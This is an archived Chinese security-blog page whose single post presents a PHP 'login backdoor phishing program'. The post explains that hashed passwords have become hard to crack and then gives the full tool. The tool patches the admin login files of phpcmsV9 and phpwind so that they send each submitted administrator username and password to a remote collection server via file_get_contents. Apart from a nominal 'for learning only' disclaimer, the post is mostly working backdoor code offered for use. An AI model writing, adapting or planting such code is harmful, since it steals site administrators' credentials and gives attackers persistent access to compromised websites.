<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  
  <title>钓鱼 | Return&#39;s Blog </title>
  <meta name="author" content="Return">
  
  <meta name="description" content="专注于互联网开发技术，注重网络安全技术，注重网络攻防技术，注重渗透测试技术，backtrack5渗透测试平台研究，软件开发，网页设计，网页制作，网站建设">
  
  
  
  <meta property="og:site_name" content="Return&#39;s Blog "/>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  
    <meta property="og:image" content="undefined"/>
  
   <link rel="apple-touch-icon" href="/icon.png" />
   <link rel="shortcut icon" href="/favicon.png" >
   <link rel="alternate" href="http://www.creturn.com/atom.xml" title="Return&#39;s Blog " type="application/atom+xml">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.8/jquery.min.js"></script>
</head>


<body>
  <div id="content" class="inner">
    <aside id="sidebar" class="alignleft">
      <div class="navigationBar">
        <a href="/">Return&#39;s Blog </a>
      </div>
    	
  <nav class="widget" id="menu">
	<ul>
    
      <li class="cell"><a class="next" href="/">Home</a><li>
    
      <li class="cell"><a class="next" href="/archives/">Archives</a><li>
    
      <li class="cell"><a class="next" href="/about/">About</a><li>
    
    </ul>
</nav>

  
<div class="widget tag">
  <h3 class="title">分类</h3>
  <ul class="entry">
  
    <li><a href="/categories/原创作品/">原创作品</a><small>30</small></li>
  
    <li><a href="/categories/原创作品/技术文章/">技术文章</a><small>23</small></li>
  
    <li><a href="/categories/技术文章/">技术文章</a><small>7</small></li>
  
    <li><a href="/categories/原创作品/技术文章/最新漏洞/">最新漏洞</a><small>3</small></li>
  
    <li><a href="/categories/技术文章/最新漏洞/">最新漏洞</a><small>2</small></li>
  
    <li><a href="/categories/最新漏洞/">最新漏洞</a><small>1</small></li>
  
  </ul>
</div>


  
<div class="widget tagcloud">
  <h3 class="title">标签云</h3>
  <div class="entry">
    <a href="/tags/Android/" style="font-size: 10.00px;">Android</a><a href="/tags/Backtrack5/" style="font-size: 10.00px;">Backtrack5</a><a href="/tags/Metasploit/" style="font-size: 10.00px;">Metasploit</a><a href="/tags/Mysql/" style="font-size: 10.00px;">Mysql</a><a href="/tags/Nginx解析漏洞/" style="font-size: 10.00px;">Nginx解析漏洞</a><a href="/tags/Return/" style="font-size: 10.00px;">Return</a><a href="/tags/ThinkPHP远程/" style="font-size: 10.00px;">ThinkPHP远程</a><a href="/tags/alfred/" style="font-size: 10.00px;">alfred</a><a href="/tags/android/" style="font-size: 13.33px;">android</a><a href="/tags/apache/" style="font-size: 10.00px;">apache</a><a href="/tags/armitage/" style="font-size: 10.00px;">armitage</a><a href="/tags/arp欺骗/" style="font-size: 10.00px;">arp欺骗</a><a href="/tags/cain/" style="font-size: 10.00px;">cain</a><a href="/tags/dedecms漏洞/" style="font-size: 10.00px;">dedecms漏洞</a><a href="/tags/easyui/" style="font-size: 10.00px;">easyui</a><a href="/tags/eclipse/" style="font-size: 10.00px;">eclipse</a><a href="/tags/java/" style="font-size: 10.00px;">java</a><a href="/tags/linux arp欺骗/" style="font-size: 10.00px;">linux arp欺骗</a><a href="/tags/os x/" style="font-size: 10.00px;">os x</a><a href="/tags/php/" style="font-size: 13.33px;">php</a><a href="/tags/phpcmsv9漏洞/" style="font-size: 16.67px;">phpcmsv9漏洞</a><a href="/tags/phpcsm2008漏洞/" style="font-size: 10.00px;">phpcsm2008漏洞</a><a href="/tags/python/" style="font-size: 13.33px;">python</a><a href="/tags/thinkPHP漏洞/" style="font-size: 10.00px;">thinkPHP漏洞</a><a href="/tags/ubuntu/" style="font-size: 10.00px;">ubuntu</a><a href="/tags/web wifi认证/" style="font-size: 10.00px;">web wifi认证</a><a href="/tags/webshell/" style="font-size: 20.00px;">webshell</a><a href="/tags/window密码/" style="font-size: 10.00px;">window密码</a><a href="/tags/wordpress漏洞/" style="font-size: 13.33px;">wordpress漏洞</a><a href="/tags/workflow/" style="font-size: 10.00px;">workflow</a><a href="/tags/xUtils/" style="font-size: 10.00px;">xUtils</a><a href="/tags/互联网技术/" style="font-size: 10.00px;">互联网技术</a><a href="/tags/任意密码登录/" style="font-size: 10.00px;">任意密码登录</a><a href="/tags/任意读取文件漏洞/" style="font-size: 10.00px;">任意读取文件漏洞</a><a href="/tags/入侵/" style="font-size: 10.00px;">入侵</a><a href="/tags/后门/" style="font-size: 20.00px;">后门</a><a href="/tags/嗅探/" style="font-size: 10.00px;">嗅探</a><a href="/tags/图马/" style="font-size: 10.00px;">图马</a><a href="/tags/打飞机/" style="font-size: 10.00px;">打飞机</a><a href="/tags/注入漏洞/" style="font-size: 10.00px;">注入漏洞</a>
  </div>
</div>


    	<footer id="footer" class="inner"><div class="copyright">
  
  &copy; 2014 Return
  
</div>


<div style="position:relative; bottom: 23px">
  <script src="http://s95.cnzz.com/stat.php?id=4287542&web_id=4287542&show=pic1" language="JavaScript">
  </script>
</div>


</footer>
    </aside>
    
    
    <div id="hidden-navigationBar" class="navigationBar">
      <a href="/">Return&#39;s Blog </a>
    </div>
    <div id="main-col" class="alignright">
    <div id="wrapper">
      
<h2 class="archive-title tag">钓鱼</h2>


  
    
<article class="post">
  
    <div class="gallery">
  <div class="photoset">
    
      <img src="">
    
  </div>
  <div class="control">
    <div class="prev"></div>
    <div class="next"></div>
  </div>
</div>
  
  <div class="post-content">
  <header>
      
      
  
    <h1 class="title"><a href="/html/2012-07-03-登录后门钓鱼程序-v1-0.html">登录后门钓鱼程序 V1.0</a></h1>
  

      <time datetime="2012-07-02T17:32:15.000Z"><a href="/html/2012-07-03-登录后门钓鱼程序-v1-0.html">7月 3 2012</a></time>
      
  </header>
    <div class="entry">
      
        <p>现在的各大cms也好bbs也好。对于用户的加密方式已经不仅仅局限于md5(密码)了。大家都知道一次md5加密的密码，</p>
<p>如果系统一旦有注入漏洞被获取到加密后的密码通过一些付费或者免费的网站是完全可以破解密码的，而现在那些主流</p>
<p>cms或者bbs加密方式越来月多样化了，导致即使拿到管理员数据库中的加密密码也没用了，所有就有了这个程序。</p>
<p>先上代码：</p>
<p>程序端:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
</pre></td><td class="code"><pre><span class="preprocessor">&lt;?php</span>
<span class="comment">/**
 +-----------------------------------------------------------------
 * 登录后门钓鱼程序 V1.0
 +-----------------------------------------------------------------
 * 功能介绍：
 * 本程序会根据所选cms和BBS系统自动插入钓鱼后门
 * 后续将完善支持PHP的主流的cms和bbs系统
 * 本程序仅供学习参考，请勿非法用途 ，请保留版权信息
 +-----------------------------------------------------------------
 * 作者： Return Blogs: www.creturn.com
 +-----------------------------------------------------------------
 **/</span>
error_reporting(<span class="number">0</span>);
<span class="variable">$rHost</span> = <span class="string">'http://192.168.1.199/MyProject/server/sever.php'</span>; <span class="comment">//定义接收地址</span>
<span class="variable">$pUname</span> = <span class="string">'uname'</span>; <span class="comment">//远程端接收用户名参数</span>
<span class="variable">$pPwd</span> = <span class="string">'pwd'</span>; <span class="comment">//定义远程接收密码参数</span>
<span class="variable">$error</span> = <span class="string">''</span>;
<span class="comment">/**
 * 插入代码
 */</span>
<span class="function"><span class="keyword">function</span> <span class="title">inSertPwdDoor</span><span class="params">(<span class="variable">$cmsCode</span>,<span class="variable">$relPath</span>)</span>{</span>
 <span class="keyword">global</span> <span class="variable">$rHost</span>,<span class="variable">$pUname</span>,<span class="variable">$pPwd</span>;
 <span class="comment">//读取用户名密码特制</span>
 <span class="keyword">if</span>(<span class="variable">$cmsCode</span>[<span class="string">'mothed'</span>] == <span class="string">'post'</span>){
 <span class="variable">$rHostPath</span> = <span class="variable">$rHost</span>.<span class="string">'?'</span>.<span class="variable">$pUname</span>.<span class="string">'=$_POST['</span>.<span class="variable">$cmsCode</span>[<span class="string">'uname'</span>].<span class="string">']&amp;'</span>.<span class="variable">$pPwd</span>.<span class="string">'=$_POST['</span>.<span class="variable">$cmsCode</span>[<span class="string">'pwd'</span>].<span class="string">']'</span>;
 }<span class="keyword">else</span>{
 <span class="variable">$rHostPath</span> = <span class="variable">$rHost</span>.<span class="string">'?'</span>.<span class="variable">$pUname</span>.<span class="string">'=$_GET['</span>.<span class="variable">$cmsCode</span>[<span class="string">'uname'</span>].<span class="string">']&amp;'</span>.<span class="variable">$pPwd</span>.<span class="string">'=$_GET['</span>.<span class="variable">$cmsCode</span>[<span class="string">'pwd'</span>].<span class="string">']'</span>;
 }
 <span class="comment">//获取插入代码</span>
 <span class="variable">$keyword</span> = <span class="variable">$cmsCode</span>[<span class="string">'keyword'</span>];
 <span class="variable">$replace</span> = <span class="string">'file_get_contents(&quot;'</span>.<span class="variable">$rHostPath</span>.<span class="string">'&quot;);'</span>.<span class="variable">$cmsCode</span>[<span class="string">'bedeck'</span>].<span class="variable">$keyword</span>;
 <span class="variable">$loginPageContent</span> = file_get_contents(<span class="variable">$relPath</span>);
 <span class="variable">$loginPageContent</span> = str_replace(<span class="variable">$keyword</span>, <span class="variable">$replace</span>, <span class="variable">$loginPageContent</span>);
 <span class="keyword">if</span>(file_put_contents(<span class="variable">$relPath</span>, <span class="variable">$loginPageContent</span>)){
 tipAmessage(<span class="string">'成功插入！'</span>);
 }<span class="keyword">else</span>{
 tipAmessage(<span class="string">'插入失败！'</span>);
 }
}

<span class="function"><span class="keyword">function</span> <span class="title">tipAmessage</span><span class="params">(<span class="variable">$msg</span>)</span>{</span>
 <span class="keyword">global</span> <span class="variable">$error</span>;
 <span class="variable">$error</span> = <span class="variable">$msg</span>;
}
<span class="comment">/**
 * 各类cms登录标识码和文件路径
 *
 * $code说明：
 * $code['keyword'] 关键字，就是要插入代码的特征码
 * $code['bedeck'] 修饰符用来修正代码的外观
 * $code['uname'] 用户名变量名
 * $code['pwd'] 密码变量名
 * $code['mothed'] 密码提交方式：POST 或者 GET
 * $code['path'] 登录文件路径
 * 注意事项：
 * 由于登录口不同程序可能有多个登录方法，正常登录
 * 或者ajax或者第三方登录，所以登录点的关键词必须找准
 */</span>
<span class="function"><span class="keyword">function</span> <span class="title">switchCms</span><span class="params">(<span class="variable">$cmsName</span>)</span>{</span>
 <span class="variable">$code</span> = <span class="keyword">array</span>();
 <span class="keyword">switch</span> (<span class="variable">$cmsName</span>) {
 <span class="keyword">case</span> <span class="string">'phpcmsV9'</span>:
 <span class="variable">$code</span>[<span class="string">'path'</span>] = <span class="string">'phpcms/modules/admin/index.php'</span>;
 <span class="variable">$code</span>[<span class="string">'keyword'</span>] = &quot;showmessage(L(<span class="string">'login_success'</span>),<span class="string">'?m=admin&amp;c=index'</span>);&quot;;
 <span class="variable">$code</span>[<span class="string">'bedeck'</span>] = &quot;nttt&quot;;
 <span class="variable">$code</span>[<span class="string">'uname'</span>] = <span class="string">'username'</span>;
 <span class="variable">$code</span>[<span class="string">'pwd'</span>] = <span class="string">'password'</span>;
 <span class="variable">$code</span>[<span class="string">'mothed'</span>] = <span class="string">'post'</span>;
 <span class="keyword">break</span>;
 <span class="keyword">case</span> <span class="string">'phpwind'</span>:
 <span class="variable">$code</span>[<span class="string">'path'</span>] = <span class="string">'admin/admincp.php'</span>;
 <span class="variable">$code</span>[<span class="string">'keyword'</span>] = &quot;<span class="variable">$REQUEST_URI</span> = trim(<span class="variable">$REQUEST_URI</span>,<span class="string">'?#'</span>);&quot;;
 <span class="variable">$code</span>[<span class="string">'bedeck'</span>] = &quot;nt&quot;;
 <span class="variable">$code</span>[<span class="string">'uname'</span>] = <span class="string">'admin_name'</span>;
 <span class="variable">$code</span>[<span class="string">'pwd'</span>] = <span class="string">'admin_pwd'</span>;
 <span class="variable">$code</span>[<span class="string">'mothed'</span>] = <span class="string">'post'</span>;
 <span class="keyword">break</span>;
 }
 <span class="keyword">return</span> <span class="variable">$code</span>;

}
<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">'creack'</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">'creack'</span>] != <span class="string">''</span>){
 <span class="variable">$webRoot</span> = <span class="variable">$_SERVER</span>[<span class="string">'DOCUMENT_ROOT'</span>]; <span class="comment">//当前目录</span>
 <span class="variable">$dir</span> = <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">'dir'</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">'dir'</span>]) ? trim(<span class="variable">$_POST</span>[<span class="string">'dir'</span>]) : <span class="string">''</span>;
 <span class="variable">$cms</span> = <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">'cms'</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">'cms'</span>]) ? trim(<span class="variable">$_POST</span>[<span class="string">'cms'</span>]) : <span class="string">''</span>;
 <span class="variable">$cmsCode</span> = switchCms(<span class="variable">$_POST</span>[<span class="string">'cms'</span>]);
 <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$cmsCode</span>)){
 <span class="variable">$error</span> = <span class="string">'没找到可用CMS或者BBS'</span>;
 }<span class="keyword">else</span>{
 <span class="variable">$relPath</span> = <span class="variable">$webRoot</span>.<span class="variable">$dir</span>.<span class="variable">$cmsCode</span>[<span class="string">'path'</span>];
 <span class="keyword">if</span>(file_exists(<span class="variable">$relPath</span>)){
 inSertPwdDoor(<span class="variable">$cmsCode</span>,<span class="variable">$relPath</span>);
 }<span class="keyword">else</span>{
 tipAmessage(<span class="string">'没有找到该文件路径：'</span>.<span class="variable">$relPath</span>);
 }
 }
}
<span class="preprocessor">?&gt;</span>
&lt;!DOCTYPE html <span class="keyword">PUBLIC</span> &quot;-<span class="comment">//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;</span>
&lt;html xmlns=&quot;http:<span class="comment">//www.w3.org/1999/xhtml&quot;&gt;</span>
&lt;head&gt;
&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-<span class="number">8</span>&quot; /&gt;
&lt;title&gt;自动插入语句&lt;/title&gt;
&lt;style type=&quot;text/css&quot;&gt;
*{
font-size:<span class="number">14</span>px;
line-height:<span class="number">20</span>px;
}
div{
 width:<span class="number">450</span>px;
 margin: <span class="number">0</span>px auto;
}

&lt;/style&gt;
&lt;/head&gt;

&lt;body&gt;
&lt;div style=&quot;width:<span class="number">600</span>px;margin: <span class="number">0</span>px auto;padding-top: <span class="number">50</span>px;padding-bottom: <span class="number">50</span>px; border: <span class="number">1</span>px <span class="comment">#fff012 solid;&quot;&gt;</span>
&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;
 &lt;div&gt;
 &lt;h2 style=&quot;text-align: center;&quot;&gt;登录后门钓鱼程序 V1<span class="number">.0</span> &lt;/h2&gt;
 &lt;/div&gt;
 &lt;div&gt;
 &lt;h4 style=&quot;color: red&quot;&gt;注意：Path参数，默认根目录不用填写，如果目标程序在子目录中请填入路径&lt;/h4&gt;
 &lt;/div&gt;
 &lt;div&gt;
 当前文件路径：&lt;?php <span class="keyword">echo</span> <span class="keyword">__FILE__</span>?&gt;&lt;br/&gt;
 &lt;/div&gt;
 &lt;div&gt;
 &lt;input type=&quot;radio&quot; value=&quot;dz&quot; name=&quot;cms&quot; id=&quot;dzcms&quot; /&gt;&lt;label <span class="keyword">for</span>=&quot;dzcms&quot;&gt;Discuz&lt;/label&gt;
 &lt;input type=&quot;radio&quot; value=&quot;phpwind&quot; name=&quot;cms&quot; id=&quot;phpwind&quot; /&gt;&lt;label <span class="keyword">for</span>=&quot;phpwind&quot;&gt;PhpWind&lt;/label&gt;
 &lt;input type=&quot;radio&quot; value=&quot;phpcmsV9&quot; name=&quot;cms&quot; id=&quot;v9cms&quot; /&gt;&lt;label <span class="keyword">for</span>=&quot;v9cms&quot;&gt;PHPCMSv9&lt;/label&gt;
 &lt;input type=&quot;radio&quot; value=&quot;dedecms&quot; name=&quot;cms&quot; id=&quot;dedecms&quot; /&gt;&lt;label <span class="keyword">for</span>=&quot;dedecms&quot;&gt;DedeCms&lt;/label&gt;
 &lt;input type=&quot;radio&quot; value=&quot;wordpress&quot; name=&quot;cms&quot; id=&quot;wrodpress&quot; /&gt;&lt;label <span class="keyword">for</span>=&quot;wrodpress&quot;&gt;WordPress&lt;/label&gt;
 &lt;/div&gt;

 &lt;div&gt;
 &lt;span&gt;Path:&lt;/span&gt;&lt;/span&gt;&lt;input type=&quot;text&quot; name=&quot;dir&quot; /&gt;
 &lt;input type=&quot;submit&quot; name=&quot;creack&quot; value=&quot;插入后门&quot; /&gt;
 &lt;/div&gt;
 &lt;div style=&quot;text-align: left; color: red; margin-top:<span class="number">20</span>px;&quot;&gt;消息：&lt;?php <span class="keyword">echo</span> <span class="variable">$error</span>;?&gt;&lt;/div&gt;
&lt;/form&gt;
&lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;
</pre></td></tr></table></figure>

<p>
      
    </div>
    <footer>
      
        
          <div class="alignleft">
            <a href="/html/2012-07-03-登录后门钓鱼程序-v1-0.html#more" class="more-link">Read More</a>
          </div>
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>



  

  <nav id="pagination">
  
  
</nav>
</div>
    </div>
    <div class="tabbar" onload="divideTabBar()">
	
      <div class="tabbaritem"><a class="next" href="/">Home</a></div>
    
      <div class="tabbaritem"><a class="next" href="/archives/">Archives</a></div>
    
      <div class="tabbaritem"><a class="next" href="/about/">About</a></div>
    
</div>


  </div>
</body>
</html>